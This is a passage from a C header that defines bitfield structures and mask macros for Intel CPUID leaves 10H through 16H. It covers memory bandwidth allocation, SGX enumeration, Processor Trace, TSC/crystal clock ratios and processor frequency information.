 * @note Leaf 10H output depends on the initial value in ECX.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 11:0] Reports the maximum MBA throttling value supported for the corresponding ResID
       * using minus-one notation.
       */
      UINT32 MaxMbaThrottlingValue : 12;
#define CPUID_EAX_MAX_MBA_THROTTLING_VALUE_BIT 0
#define CPUID_EAX_MAX_MBA_THROTTLING_VALUE_FLAG 0xFFF
#define CPUID_EAX_MAX_MBA_THROTTLING_VALUE_MASK 0xFFF
#define CPUID_EAX_MAX_MBA_THROTTLING_VALUE(_) (((_) >> 0) & 0xFFF)
      UINT32 Reserved1 : 20;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] EBX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT 0
#define CPUID_EBX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EBX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      UINT32 Reserved1 : 2;

      /**
       * [Bit 2] Reports whether the response of the delay values is linear.
       */
      UINT32 ResponseOfDelayIsLinear : 1;
#define CPUID_ECX_RESPONSE_OF_DELAY_IS_LINEAR_BIT 2
#define CPUID_ECX_RESPONSE_OF_DELAY_IS_LINEAR_FLAG 0x04
#define CPUID_ECX_RESPONSE_OF_DELAY_IS_LINEAR_MASK 0x01
#define CPUID_ECX_RESPONSE_OF_DELAY_IS_LINEAR(_) (((_) >> 2) & 0x01)
      UINT32 Reserved2 : 29;
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 15:0] Highest COS number supported for this ResID.
       */
      UINT32 HighestCosNumberSupported : 16;
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_BIT 0
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_FLAG 0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_MASK 0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED(_) (((_) >> 0) & 0xFFFF)
      UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_10_ECX_03;

/**
 * @}
 */

/**
 * @defgroup CPUID_EAX_12 \
 *           EAX = 0x12
 *
 * When CPUID executes with EAX set to 12H and ECX = 0H, the processor returns information about
 * Intel SGX capabilities. When CPUID executes with EAX set to 12H and ECX = 1H, the processor
 * returns information about Intel SGX attributes. When CPUID executes with EAX set to 12H and ECX =
 * n (n > 1), the processor returns information about Intel SGX Enclave Page Cache.
 * @{
 */
#define CPUID_INTEL_SGX 0x00000012
/**
 * @brief Intel SGX Capability Enumeration Leaf, sub-leaf 0 (EAX = 12H, ECX = 0)
 *
 * @note Leaf 12H sub-leaf 0 (ECX = 0) is supported if CPUID.(EAX=07H, ECX=0H):EBX[SGX] = 1.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bit 0] If 1, Indicates Intel SGX supports the collection of SGX1 leaf functions.
       */
      UINT32 Sgx1 : 1;
#define CPUID_EAX_SGX1_BIT 0
#define CPUID_EAX_SGX1_FLAG 0x01
#define CPUID_EAX_SGX1_MASK 0x01
#define CPUID_EAX_SGX1(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] If 1, Indicates Intel SGX supports the collection of SGX2 leaf functions.
       */
      UINT32 Sgx2 : 1;
#define CPUID_EAX_SGX2_BIT 1
#define CPUID_EAX_SGX2_FLAG 0x02
#define CPUID_EAX_SGX2_MASK 0x01
#define CPUID_EAX_SGX2(_) (((_) >> 1) & 0x01)
      UINT32 Reserved1 : 3;

      /**
       * [Bit 5] If 1, indicates Intel SGX supports ENCLV instruction leaves EINCVIRTCHILD,
       * EDECVIRTCHILD, and ESETCONTEXT.
       */
      UINT32 SgxEnclvAdvanced : 1;
#define CPUID_EAX_SGX_ENCLV_ADVANCED_BIT 5
#define CPUID_EAX_SGX_ENCLV_ADVANCED_FLAG 0x20
#define CPUID_EAX_SGX_ENCLV_ADVANCED_MASK 0x01
#define CPUID_EAX_SGX_ENCLV_ADVANCED(_) (((_) >> 5) & 0x01)

      /**
       * [Bit 6] If 1, indicates Intel SGX supports ENCLS instruction leaves ETRACKC, ERDINFO,
       * ELDBC, and ELDUC.
       */
      UINT32 SgxEnclsAdvanced : 1;
#define CPUID_EAX_SGX_ENCLS_ADVANCED_BIT 6
#define CPUID_EAX_SGX_ENCLS_ADVANCED_FLAG 0x40
#define CPUID_EAX_SGX_ENCLS_ADVANCED_MASK 0x01
#define CPUID_EAX_SGX_ENCLS_ADVANCED(_) (((_) >> 6) & 0x01)
      UINT32 Reserved2 : 25;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] Bit vector of supported extended SGX features.
       */
      UINT32 Miscselect : 32;
#define CPUID_EBX_MISCSELECT_BIT 0
#define CPUID_EBX_MISCSELECT_FLAG 0xFFFFFFFF
#define CPUID_EBX_MISCSELECT_MASK 0xFFFFFFFF
#define CPUID_EBX_MISCSELECT(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 7:0] The maximum supported enclave size in non-64-bit mode is 2^(EDX[7:0]).
       */
      UINT32 MaxEnclaveSizeNot64 : 8;
#define CPUID_EDX_MAX_ENCLAVE_SIZE_NOT64_BIT 0
#define CPUID_EDX_MAX_ENCLAVE_SIZE_NOT64_FLAG 0xFF
#define CPUID_EDX_MAX_ENCLAVE_SIZE_NOT64_MASK 0xFF
#define CPUID_EDX_MAX_ENCLAVE_SIZE_NOT64(_) (((_) >> 0) & 0xFF)

      /**
       * [Bits 15:8] The maximum supported enclave size in 64-bit mode is 2^(EDX[15:8]).
       */
      UINT32 MaxEnclaveSize64 : 8;
#define CPUID_EDX_MAX_ENCLAVE_SIZE_64_BIT 8
#define CPUID_EDX_MAX_ENCLAVE_SIZE_64_FLAG 0xFF00
#define CPUID_EDX_MAX_ENCLAVE_SIZE_64_MASK 0xFF
#define CPUID_EDX_MAX_ENCLAVE_SIZE_64(_) (((_) >> 8) & 0xFF)
      UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_12_ECX_00;

/**
 * @brief Intel SGX Attributes Enumeration Leaf, sub-leaf 1 (EAX = 12H, ECX = 1)
 *
 * @note Leaf 12H sub-leaf 1 (ECX = 1) is supported if CPUID.(EAX=07H, ECX=0H):EBX[SGX] = 1.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Reports the valid bits of SECS.ATTRIBUTES[31:0] that software can set with
       * ECREATE.
       */
      UINT32 ValidSecsAttributes0 : 32;
#define CPUID_EAX_VALID_SECS_ATTRIBUTES_0_BIT 0
#define CPUID_EAX_VALID_SECS_ATTRIBUTES_0_FLAG 0xFFFFFFFF
#define CPUID_EAX_VALID_SECS_ATTRIBUTES_0_MASK 0xFFFFFFFF
#define CPUID_EAX_VALID_SECS_ATTRIBUTES_0(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] Reports the valid bits of SECS.ATTRIBUTES[63:32] that software can set with
       * ECREATE.
       */
      UINT32 ValidSecsAttributes1 : 32;
#define CPUID_EBX_VALID_SECS_ATTRIBUTES_1_BIT 0
#define CPUID_EBX_VALID_SECS_ATTRIBUTES_1_FLAG 0xFFFFFFFF
#define CPUID_EBX_VALID_SECS_ATTRIBUTES_1_MASK 0xFFFFFFFF
#define CPUID_EBX_VALID_SECS_ATTRIBUTES_1(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] Reports the valid bits of SECS.ATTRIBUTES[95:64] that software can set with
       * ECREATE.
       */
      UINT32 ValidSecsAttributes2 : 32;
#define CPUID_ECX_VALID_SECS_ATTRIBUTES_2_BIT 0
#define CPUID_ECX_VALID_SECS_ATTRIBUTES_2_FLAG 0xFFFFFFFF
#define CPUID_ECX_VALID_SECS_ATTRIBUTES_2_MASK 0xFFFFFFFF
#define CPUID_ECX_VALID_SECS_ATTRIBUTES_2(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] Reports the valid bits of SECS.ATTRIBUTES[127:96] that software can set with
       * ECREATE.
       */
      UINT32 ValidSecsAttributes3 : 32;
#define CPUID_EDX_VALID_SECS_ATTRIBUTES_3_BIT 0
#define CPUID_EDX_VALID_SECS_ATTRIBUTES_3_FLAG 0xFFFFFFFF
#define CPUID_EDX_VALID_SECS_ATTRIBUTES_3_MASK 0xFFFFFFFF
#define CPUID_EDX_VALID_SECS_ATTRIBUTES_3(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_12_ECX_01;

/**
 * @brief Intel SGX EPC Enumeration Leaf, sub-leaves (EAX = 12H, ECX = 2 or higher)
 *
 * @note Leaf 12H sub-leaf 2 or higher (ECX >= 2) is supported if CPUID.(EAX=07H, ECX=0H):EBX[SGX]
 * = 1. This structure describes sub-leaf type 0.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 3:0] Sub-leaf Type 0. Indicates this sub-leaf is invalid.
       */
      UINT32 SubLeafType : 4;
#define CPUID_EAX_SUB_LEAF_TYPE_BIT 0
#define CPUID_EAX_SUB_LEAF_TYPE_FLAG 0x0F
#define CPUID_EAX_SUB_LEAF_TYPE_MASK 0x0F
#define CPUID_EAX_SUB_LEAF_TYPE(_) (((_) >> 0) & 0x0F)
      UINT32 Reserved1 : 28;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] EBX is zero.
       */
      UINT32 Zero : 32;
#define CPUID_EBX_ZERO_BIT 0
#define CPUID_EBX_ZERO_FLAG 0xFFFFFFFF
#define CPUID_EBX_ZERO_MASK 0xFFFFFFFF
#define CPUID_EBX_ZERO(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is zero.
       */
      UINT32 Zero : 32;
#define CPUID_ECX_ZERO_BIT 0
#define CPUID_ECX_ZERO_FLAG 0xFFFFFFFF
#define CPUID_ECX_ZERO_MASK 0xFFFFFFFF
#define CPUID_ECX_ZERO(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is zero.
       */
      UINT32 Zero : 32;
#define CPUID_EDX_ZERO_BIT 0
#define CPUID_EDX_ZERO_FLAG 0xFFFFFFFF
#define CPUID_EDX_ZERO_MASK 0xFFFFFFFF
#define CPUID_EDX_ZERO(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_12_ECX_02P_SLT_0;

/**
 * @brief Intel SGX EPC Enumeration Leaf, sub-leaves (EAX = 12H, ECX = 2 or higher)
 *
 * @note Leaf 12H sub-leaf 2 or higher (ECX >= 2) is supported if CPUID.(EAX=07H, ECX=0H):EBX[SGX]
 * = 1. This structure describes sub-leaf type 1.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 3:0] Sub-leaf Type 1. This sub-leaf enumerates an EPC section. EBX:EAX and EDX:ECX
       * provide information on the Enclave Page Cache (EPC) section.
       */
      UINT32 SubLeafType : 4;
#define CPUID_EAX_SUB_LEAF_TYPE_BIT 0
#define CPUID_EAX_SUB_LEAF_TYPE_FLAG 0x0F
#define CPUID_EAX_SUB_LEAF_TYPE_MASK 0x0F
#define CPUID_EAX_SUB_LEAF_TYPE(_) (((_) >> 0) & 0x0F)
      UINT32 Reserved1 : 8;

      /**
       * [Bits 31:12] Bits 31:12 of the physical address of the base of the EPC section.
       */
      UINT32 EpcBasePhysicalAddress1 : 20;
#define CPUID_EAX_EPC_BASE_PHYSICAL_ADDRESS_1_BIT 12
#define CPUID_EAX_EPC_BASE_PHYSICAL_ADDRESS_1_FLAG 0xFFFFF000
#define CPUID_EAX_EPC_BASE_PHYSICAL_ADDRESS_1_MASK 0xFFFFF
#define CPUID_EAX_EPC_BASE_PHYSICAL_ADDRESS_1(_) (((_) >> 12) & 0xFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 19:0] Bits 51:32 of the physical address of the base of the EPC section.
       */
      UINT32 EpcBasePhysicalAddress2 : 20;
#define CPUID_EBX_EPC_BASE_PHYSICAL_ADDRESS_2_BIT 0
#define CPUID_EBX_EPC_BASE_PHYSICAL_ADDRESS_2_FLAG 0xFFFFF
#define CPUID_EBX_EPC_BASE_PHYSICAL_ADDRESS_2_MASK 0xFFFFF
#define CPUID_EBX_EPC_BASE_PHYSICAL_ADDRESS_2(_) (((_) >> 0) & 0xFFFFF)
      UINT32 Reserved1 : 12;
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 3:0] EPC section property encoding defined as follows:
       * - If EAX[3:0] 0000b, then all bits of the EDX:ECX pair are enumerated as 0.
       * - If EAX[3:0] 0001b, then this section has confidentiality and integrity protection.
       * All other encodings are reserved.
       */
      UINT32 EpcSectionProperty : 4;
#define CPUID_ECX_EPC_SECTION_PROPERTY_BIT 0
#define CPUID_ECX_EPC_SECTION_PROPERTY_FLAG 0x0F
#define CPUID_ECX_EPC_SECTION_PROPERTY_MASK 0x0F
#define CPUID_ECX_EPC_SECTION_PROPERTY(_) (((_) >> 0) & 0x0F)
      UINT32 Reserved1 : 8;

      /**
       * [Bits 31:12] Bits 31:12 of the size of the corresponding EPC section within the Processor
       * Reserved Memory.
       */
      UINT32 EpcSize1 : 20;
#define CPUID_ECX_EPC_SIZE_1_BIT 12
#define CPUID_ECX_EPC_SIZE_1_FLAG 0xFFFFF000
#define CPUID_ECX_EPC_SIZE_1_MASK 0xFFFFF
#define CPUID_ECX_EPC_SIZE_1(_) (((_) >> 12) & 0xFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 19:0] Bits 51:32 of the size of the corresponding EPC section within the Processor
       * Reserved Memory.
       */
      UINT32 EpcSize2 : 20;
#define CPUID_EDX_EPC_SIZE_2_BIT 0
#define CPUID_EDX_EPC_SIZE_2_FLAG 0xFFFFF
#define CPUID_EDX_EPC_SIZE_2_MASK 0xFFFFF
#define CPUID_EDX_EPC_SIZE_2(_) (((_) >> 0) & 0xFFFFF)
      UINT32 Reserved1 : 12;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_12_ECX_02P_SLT_1;

/**
 * @}
 */

/**
 * @defgroup CPUID_EAX_14 \
 *           EAX = 0x14
 *
 * When CPUID executes with EAX set to 14H and ECX = 0H, the processor returns information about
 * Intel Processor Trace extensions. When CPUID executes with EAX set to 14H and ECX = n (n > 0 and
 * less than the number of non-zero bits in CPUID.(EAX=14H, ECX= 0H).EAX), the processor returns
 * information about packet generation in Intel Processor Trace.
 * @{
 */
#define CPUID_INTEL_PROCESSOR_TRACE_INFORMATION 0x00000014
/**
 * @brief Intel Processor Trace Enumeration Main Leaf (EAX = 14H, ECX = 0)
 *
 * @note Leaf 14H main leaf (ECX = 0).
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Reports the maximum sub-leaf supported in leaf 14H.
       */
      UINT32 MaxSubLeaf : 32;
#define CPUID_EAX_MAX_SUB_LEAF_BIT 0
#define CPUID_EAX_MAX_SUB_LEAF_FLAG 0xFFFFFFFF
#define CPUID_EAX_MAX_SUB_LEAF_MASK 0xFFFFFFFF
#define CPUID_EAX_MAX_SUB_LEAF(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bit 0] If 1, indicates that IA32_RTIT_CTL.CR3Filter can be set to 1, and that
       * IA32_RTIT_CR3_MATCH MSR can be accessed.
       */
      UINT32 Flag0 : 1;
#define CPUID_EBX_FLAG0_BIT 0
#define CPUID_EBX_FLAG0_FLAG 0x01
#define CPUID_EBX_FLAG0_MASK 0x01
#define CPUID_EBX_FLAG0(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] If 1, indicates support of Configurable PSB and Cycle-Accurate Mode.
       */
      UINT32 Flag1 : 1;
#define CPUID_EBX_FLAG1_BIT 1
#define CPUID_EBX_FLAG1_FLAG 0x02
#define CPUID_EBX_FLAG1_MASK 0x01
#define CPUID_EBX_FLAG1(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] If 1, indicates support of IP Filtering, TraceStop filtering, and preservation of
       * Intel PT MSRs across warm reset.
       */
      UINT32 Flag2 : 1;
#define CPUID_EBX_FLAG2_BIT 2
#define CPUID_EBX_FLAG2_FLAG 0x04
#define CPUID_EBX_FLAG2_MASK 0x01
#define CPUID_EBX_FLAG2(_) (((_) >> 2) & 0x01)

      /**
       * [Bit 3] If 1, indicates support of MTC timing packet and suppression of COFI-based packets.
       */
      UINT32 Flag3 : 1;
#define CPUID_EBX_FLAG3_BIT 3
#define CPUID_EBX_FLAG3_FLAG 0x08
#define CPUID_EBX_FLAG3_MASK 0x01
#define CPUID_EBX_FLAG3(_) (((_) >> 3) & 0x01)

      /**
       * [Bit 4] If 1, indicates support of PTWRITE. Writes can set IA32_RTIT_CTL[12] (PTWEn) and
       * IA32_RTIT_CTL[5] (FUPonPTW), and PTWRITE can generate packets.
       */
      UINT32 Flag4 : 1;
#define CPUID_EBX_FLAG4_BIT 4
#define CPUID_EBX_FLAG4_FLAG 0x10
#define CPUID_EBX_FLAG4_MASK 0x01
#define CPUID_EBX_FLAG4(_) (((_) >> 4) & 0x01)

      /**
       * [Bit 5] If 1, indicates support of Power Event Trace. Writes can set IA32_RTIT_CTL[4]
       * (PwrEvtEn), enabling Power Event Trace packet generation.
       */
      UINT32 Flag5 : 1;
#define CPUID_EBX_FLAG5_BIT 5
#define CPUID_EBX_FLAG5_FLAG 0x20
#define CPUID_EBX_FLAG5_MASK 0x01
#define CPUID_EBX_FLAG5(_) (((_) >> 5) & 0x01)
      UINT32 Reserved1 : 26;
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bit 0] If 1, Tracing can be enabled with IA32_RTIT_CTL.ToPA = 1, hence utilizing the ToPA
       * output scheme; IA32_RTIT_OUTPUT_BASE and IA32_RTIT_OUTPUT_MASK_PTRS MSRs can be accessed.
       */
      UINT32 Flag0 : 1;
#define CPUID_ECX_FLAG0_BIT 0
#define CPUID_ECX_FLAG0_FLAG 0x01
#define CPUID_ECX_FLAG0_MASK 0x01
#define CPUID_ECX_FLAG0(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] If 1, ToPA tables can hold any number of output entries, up to the maximum allowed
       * by the MaskOrTableOffset field of IA32_RTIT_OUTPUT_MASK_PTRS.
       */
      UINT32 Flag1 : 1;
#define CPUID_ECX_FLAG1_BIT 1
#define CPUID_ECX_FLAG1_FLAG 0x02
#define CPUID_ECX_FLAG1_MASK 0x01
#define CPUID_ECX_FLAG1(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] If 1, indicates support of Single-Range Output scheme.
       */
      UINT32 Flag2 : 1;
#define CPUID_ECX_FLAG2_BIT 2
#define CPUID_ECX_FLAG2_FLAG 0x04
#define CPUID_ECX_FLAG2_MASK 0x01
#define CPUID_ECX_FLAG2(_) (((_) >> 2) & 0x01)

      /**
       * [Bit 3] If 1, indicates support of output to Trace Transport subsystem.
       */
      UINT32 Flag3 : 1;
#define CPUID_ECX_FLAG3_BIT 3
#define CPUID_ECX_FLAG3_FLAG 0x08
#define CPUID_ECX_FLAG3_MASK 0x01
#define CPUID_ECX_FLAG3(_) (((_) >> 3) & 0x01)
      UINT32 Reserved1 : 27;

      /**
       * [Bit 31] If 1, generated packets which contain IP payloads have LIP values, which include
       * the CS base component.
       */
      UINT32 Flag31 : 1;
#define CPUID_ECX_FLAG31_BIT 31
#define CPUID_ECX_FLAG31_FLAG 0x80000000
#define CPUID_ECX_FLAG31_MASK 0x01
#define CPUID_ECX_FLAG31(_) (((_) >> 31) & 0x01)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_14_ECX_00;

/**
 * @brief Intel Processor Trace Enumeration Sub-leaf (EAX = 14H, ECX = 1)
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 2:0] Number of configurable Address Ranges for filtering.
       */
      UINT32 NumberOfConfigurableAddressRangesForFiltering : 3;
#define CPUID_EAX_NUMBER_OF_CONFIGURABLE_ADDRESS_RANGES_FOR_FILTERING_BIT 0
#define CPUID_EAX_NUMBER_OF_CONFIGURABLE_ADDRESS_RANGES_FOR_FILTERING_FLAG 0x07
#define CPUID_EAX_NUMBER_OF_CONFIGURABLE_ADDRESS_RANGES_FOR_FILTERING_MASK 0x07
#define CPUID_EAX_NUMBER_OF_CONFIGURABLE_ADDRESS_RANGES_FOR_FILTERING(_) (((_) >> 0) & 0x07)
      UINT32 Reserved1 : 13;

      /**
       * [Bits 31:16] Bitmap of supported MTC period encodings.
       */
      UINT32 BitmapOfSupportedMtcPeriodEncodings : 16;
#define CPUID_EAX_BITMAP_OF_SUPPORTED_MTC_PERIOD_ENCODINGS_BIT 16
#define CPUID_EAX_BITMAP_OF_SUPPORTED_MTC_PERIOD_ENCODINGS_FLAG 0xFFFF0000
#define CPUID_EAX_BITMAP_OF_SUPPORTED_MTC_PERIOD_ENCODINGS_MASK 0xFFFF
#define CPUID_EAX_BITMAP_OF_SUPPORTED_MTC_PERIOD_ENCODINGS(_) (((_) >> 16) & 0xFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 15:0] Bitmap of supported Cycle Threshold value encodings.
       */
      UINT32 BitmapOfSupportedCycleThresholdValueEncodings : 16;
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CYCLE_THRESHOLD_VALUE_ENCODINGS_BIT 0
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CYCLE_THRESHOLD_VALUE_ENCODINGS_FLAG 0xFFFF
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CYCLE_THRESHOLD_VALUE_ENCODINGS_MASK 0xFFFF
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CYCLE_THRESHOLD_VALUE_ENCODINGS(_) (((_) >> 0) & 0xFFFF)

      /**
       * [Bits 31:16] Bitmap of supported Configurable PSB frequency encodings.
       */
      UINT32 BitmapOfSupportedConfigurablePsbFrequencyEncodings : 16;
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CONFIGURABLE_PSB_FREQUENCY_ENCODINGS_BIT 16
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CONFIGURABLE_PSB_FREQUENCY_ENCODINGS_FLAG 0xFFFF0000
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CONFIGURABLE_PSB_FREQUENCY_ENCODINGS_MASK 0xFFFF
#define CPUID_EBX_BITMAP_OF_SUPPORTED_CONFIGURABLE_PSB_FREQUENCY_ENCODINGS(_) (((_) >> 16) & 0xFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_14_ECX_01;

/**
 * @}
 */

/**
 * @brief Stamp Counter and Nominal Core Crystal Clock Information Leaf
 *
 * When CPUID executes with EAX set to 15H and ECX = 0H, the processor returns information about
 * Time Stamp Counter and Core Crystal Clock.
 *
 * @note If EBX[31:0] is 0, the TSC/"core crystal clock" ratio is not enumerated.
 * EBX[31:0]/EAX[31:0] indicates the ratio of the TSC frequency and the core crystal clock
 * frequency. If ECX is 0, the nominal core crystal clock frequency is not enumerated. "TSC
 * frequency" = "core crystal clock frequency" * EBX/EAX.
 */
#define CPUID_TIME_STAMP_COUNTER_INFORMATION 0x00000015
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] An unsigned integer which is the denominator of the TSC/"core crystal clock"
       * ratio.
       */
      UINT32 Denominator : 32;
#define CPUID_EAX_DENOMINATOR_BIT 0
#define CPUID_EAX_DENOMINATOR_FLAG 0xFFFFFFFF
#define CPUID_EAX_DENOMINATOR_MASK 0xFFFFFFFF
#define CPUID_EAX_DENOMINATOR(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] An unsigned integer which is the numerator of the TSC/"core crystal clock"
       * ratio.
       */
      UINT32 Numerator : 32;
#define CPUID_EBX_NUMERATOR_BIT 0
#define CPUID_EBX_NUMERATOR_FLAG 0xFFFFFFFF
#define CPUID_EBX_NUMERATOR_MASK 0xFFFFFFFF
#define CPUID_EBX_NUMERATOR(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] An unsigned integer which is the nominal frequency of the core crystal clock in
       * Hz.
       */
      UINT32 NominalFrequency : 32;
#define CPUID_ECX_NOMINAL_FREQUENCY_BIT 0
#define CPUID_ECX_NOMINAL_FREQUENCY_FLAG 0xFFFFFFFF
#define CPUID_ECX_NOMINAL_FREQUENCY_MASK 0xFFFFFFFF
#define CPUID_ECX_NOMINAL_FREQUENCY(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_15;

/**
 * @brief Processor Frequency Information Leaf
 *
 * When CPUID executes with EAX set to 16H, the processor returns information about Processor
 * Frequency Information.
 *
 * @note Data is returned from this interface in accordance with the processor's specification and
 * does not reflect actual values. Suitable use of this data includes the display of processor
 * information in like manner to the processor brand string and for determining the appropriate
 * range to use when displaying processor information e.g. frequency history graphs. The returned
 * information should not be used for any other purpose as the returned information does not
 *       accurately correlate to information / counters returned by other processor interfaces.
 *       While a processor may support the Processor Frequency Information leaf, fields that return
 * a value of zero are not supported.
 */
#define CPUID_PROCESSOR_FREQUENCY_INFORMATION 0x00000016
typedef struct {
  union {
    struct {
      /**
       * [Bits 15:0] Processor Base Frequency (in MHz).
       */
      UINT32 ProcesorBaseFrequencyMhz : 16;
#define CPUID_EAX_PROCESOR_BASE_FREQUENCY_MHZ_BIT 0
#define CPUID_EAX_PROCESOR_BASE_FREQUENCY_MHZ_FLAG 0xFFFF
#define CPUID_EAX_PROCESOR_BASE_FREQUENCY_MHZ_MASK 0xFFFF
#define CPUID_EAX_PROCESOR_BASE_FREQUENCY_MHZ(_) (((_) >> 0) & 0xFFFF)
      UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 15:0] Maximum Frequency (in MHz).
       */
      UINT32 ProcessorMaximumFrequencyMhz : 16;
#define CPUID_EBX_PROCESSOR_MAXIMUM_FREQUENCY_MHZ_BIT 0
#define CPUID_EBX_PROCESSOR_MAXIMUM_FREQUENCY_MHZ_FLAG 0xFFFF
#define CPUID_EBX_PROCESSOR_MAXIMUM_FREQUENCY_MHZ_MASK 0xFFFF
#define CPUID_EBX_PROCESSOR_MAXIMUM_FREQUENCY_MHZ(_) (((_) >> 0) & 0xFFFF)
      UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 15:0] Bus (Reference) Frequency (in MHz).
       */
      UINT32 BusFrequencyMhz : 16;
#define CPUID_ECX_BUS_FREQUENCY_MHZ_BIT 0
#define CPUID_ECX_BUS_FREQUENCY_MHZ_FLAG 0xFFFF
#define CPUID_ECX_BUS_FREQUENCY_MHZ_MASK 0xFFFF
#define CPUID_ECX_BUS_FREQUENCY_MHZ(_) (((_) >> 0) & 0xFFFF)
      UINT32 Reserved1 : 16;
    };

